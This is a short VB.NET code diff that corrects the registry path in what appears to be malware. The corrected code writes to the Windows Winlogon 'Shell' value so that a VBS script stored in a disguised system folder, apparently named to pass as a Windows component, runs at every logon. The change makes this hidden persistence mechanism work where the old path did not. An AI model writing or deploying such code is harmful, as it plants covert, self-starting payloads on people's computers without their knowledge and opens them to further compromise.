@@ -20,7 +20,7 @@ Module Program
     Sub Main()
         If File.Exists("kek.txt") Then
             Try
-                Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Microsoft\Windows NT\Winlogon")
+                Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon")
                 reg.SetValue("Shell", "explorer.exe, wscript.exe ""C:\windows\winbase_base_procid_none\secureloc0x65\WinRapistI386.vbs""")
                 reg.Dispose()
             Catch
